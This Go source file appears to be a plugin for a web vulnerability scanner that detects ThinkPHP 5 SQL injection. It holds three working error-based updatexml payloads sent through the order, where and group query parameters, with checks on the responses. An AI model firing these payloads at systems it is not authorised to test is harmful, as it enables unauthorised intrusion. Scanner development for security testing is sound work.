/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package thinkphp

import (
	"context"
	"fmt"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

type Sqli struct{}

// ThinkPHP SQL injection payload definitions
var sqliPayloads = []struct {
	Path     string
	ParamKey string
	Payload  string
	Check    func(body string, marker string) bool
}{
	// TP5 order by updatexml error-based injection
	{
		Path:     "/index.php",
		ParamKey: "order[id]",
		Payload:  "updatexml(1,concat(0x7e,{{marker}},0x7e),1)",
		Check: func(body, marker string) bool {
			return strings.Contains(body, "~"+marker+"~") ||
				strings.Contains(body, "XPATH syntax error")
		},
	},
	// TP5 where injection
	{
		Path:     "/index.php",
		ParamKey: "where[id]",
		Payload:  "1) and updatexml(1,concat(0x7e,{{marker}},0x7e),1)--+",
		Check: func(body, marker string) bool {
			return strings.Contains(body, "~"+marker+"~") ||
				strings.Contains(body, "XPATH syntax error")
		},
	},
	// TP5 aggregate function injection via group parameter
	{
		Path:     "/index.php",
		ParamKey: "group[id]",
		Payload:  "1) and updatexml(1,concat(0x7e,{{marker}},0x7e),1)--+",
		Check: func(body, marker string) bool {
			return strings.Contains(body, "~"+marker+"~") ||
				strings.Contains(body, "XPATH syntax error")
		},
	},
}

func (*Sqli) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection thinkphp/sqli, %s", flow.Request.URL())

			for _, p := range sqliPayloads {
				marker := utils.RandLetters(8)
				payload := strings.Replace(p.Payload, "{{marker}}", marker, -1)

				reqUrl, err := flow.Request.URL().Parse(p.Path)
				if err != nil {
					continue
				}
				// Add the injection parameter to the query string
				q := reqUrl.Query()
				q.Set(p.ParamKey, payload)
				reqUrl.RawQuery = q.Encode()

				req, err := http.NewRequest("GET", reqUrl.String(), nil)
				if err != nil {
					continue
				}

				res, err := ab.HTTPClient.Respond(ctx, req)
				if err != nil {
					continue
				}

				if p.Check(res.Text, marker) {
					v := ab.NewWebVuln(req, res, nil)
					if v != nil {
						v.SetTargetURL(flow.Request.URL())
						v.Payload = fmt.Sprintf("%s=%s", p.ParamKey, payload)
						ab.OutputVuln(v)
					}
					return nil
				}
			}
			return nil
		},
		Channel: "web-generic",
		Binding: &model.VulnBinding{
			ID:       "thinkphp/sqli/default",
			Plugin:   "thinkphp/sqli/default",
			Category: "thinkphp/sqli/default",
			Severity: model.SeverityHigh,
		},
	}
}
